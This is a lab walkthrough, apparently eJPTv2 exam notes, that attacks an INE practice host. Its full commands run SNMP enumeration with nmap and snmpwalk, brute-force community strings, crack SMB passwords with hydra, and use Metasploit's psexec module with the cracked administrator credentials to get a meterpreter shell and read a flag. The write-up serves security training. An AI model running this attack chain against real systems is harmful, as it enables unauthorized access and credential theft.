# Simple Network Management Protocol (SNMP) - 162

## Q&A
- __1.What is the main purpose of the Simple Network Management Protocol (SNMP)?__
  - __Ans. `To manage and monitor network devices`__

- __Step 1:  let's check if the SNMP port is open or not__
  - __`nmap -sU -p 161 demo.ine.local`__

  > __Note: We will have to double-check nmap results by sending SNMP requests to the host and checking if we get responses from both. Sometimes, when host-based firewalls protect the hosts, they may confuse the nmap scan results.__

- __Step 2: Now, we need to find the SNMP server community string to access the target machine service.__
  - __First, we need to discover the community strings to access the SNMP service.__
  > Note: If you are not familiar with SNMP terms like communities, please, take a look at the course material.
  - __We could use nmap snmp-brute script to find the community string. The script uses the snmpcommunities.lst list for brute-forcing it is located inside /usr/share/nmap/nselib/data/snmpcommunities.lst directory.__
  - __Command__
    - __`nmap -sU -p 161 --script=snmp-brute demo.ine.local`__

![image1](https://github.com/Chittu13/eJPTv2/blob/main/Image/SNMP/image1.jpg)
  - __As we can see, we found three community names: `public`, `private`, and `secret`__

- __Step 3: Now, let's run the snmpwalk tool to find all the information via SNMP.__
  - __Command__
    - __`snmpwalk -v 1 -c public demo.ine.local`__
    - __`-v`: Specifies SNMP version to use__
    - __`-c`: Set the community string__
![image2](https://github.com/Chittu13/eJPTv2/blob/main/Image/SNMP/image2.jpg)

- __We were able to gather a lot of information via SNMP. But, this isn't in a proper readable format. We need to take the help of other tools, i.e., nmap SNMP scripts, for specific information.__

- __Step 3: Let's run all the SNMP nmap scripts to gather all possible information via the SNMP service.__
 - __Command__
	- __`nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output`__
	- __The above command would run all the nmap SNMP scripts on the target machine and store its output to the__
	- __`snmp_output`__
	- __file.__

  - __This nmap script scan would take some time. Please wait patiently.__

  - __From the list of information retrieved, we found a couple of engaging data, such as running processes, users, services, installed applications, etc.__

  - __However, analyzing the results, one absorbing information we could extract is the list of Windows users:__
  - ![image3](https://github.com/Chittu13/eJPTv2/blob/main/Image/SNMP/image3.jpg)

- __Step 4: Now, let's run a brute-force attack using these windows users on SMB service.__
  - __Remember, port 445 is open, and we can run a brute-force attack using the hydra tool.__
  - __First, let's save two usernames in a file. i.e administrator and admin__
  - ![image4](https://github.com/Chittu13/eJPTv2/blob/main/Image/SNMP/image4.jpg)
  - __Command__
	- __`hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb`__
	- __The hydra switches are described in the help: hydra -help. However, the most relevant parts of the command are explained below:__
	- __`-L users.txt`__
	- __This is the dictionary file containing a list of users.__
	- __`-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`__

    - __This tells hydra to use a dictionary file containing a list of known passwords. This particular file (unix_passwords.txt) belongs to "Metasploit Framework"__
    - __This is the protocol that should be used by hydra to perform the brute-force attack.__
    - __After a couple of minutes, we should see the following results:__
    - ![image5](https://github.com/Chittu13/eJPTv2/blob/main/Image/SNMP/image5.jpg)
	- __Thus, hydra successfully found a valid password for administrator and admin users.__

- __Step 5: Now, we will run the psexec Metasploit exploit module to gain the meterpreter session using these credentials.__
  - __Let's try to get a shell on this system using the PSExec module of the Metasploit framework.__
  - __PSExec (Microsoft Windows Authenticated User Code Execution)__
  - __Commands__
```
msfconsole -q
use exploit/windows/smb/psexec
show options
```
  - ![image6](https://github.com/Chittu13/eJPTv2/blob/main/Image/SNMP/image6.jpg)

  - __As we can see, we have to set RHOSTS SMBUSER and SMBPASS. Rest all other essential values, i.e. PAYLOAD, and LHOST, is already set.__
  - __Commands__
```
set RHOSTS demo.ine.local
set SMBUSER administrator
set SMBPASS elizabeth
exploit
```
  - > __Note: If you don't gain a meterpreter session for some reason, please re-exploit the target.__
  - ![image7](https://github.com/Chittu13/eJPTv2/blob/main/Image/SNMP/image7.jpg)
  - __We have successfully gained the meterpreter session on the target machine.__

- __Step 6: Now, let's read the flag.__
  - __Commands__
```
shell
cd C:\
dir
type FLAG1.txt
```
  - ![image8](https://github.com/Chittu13/eJPTv2/blob/main/Image/SNMP/image8.jpg)
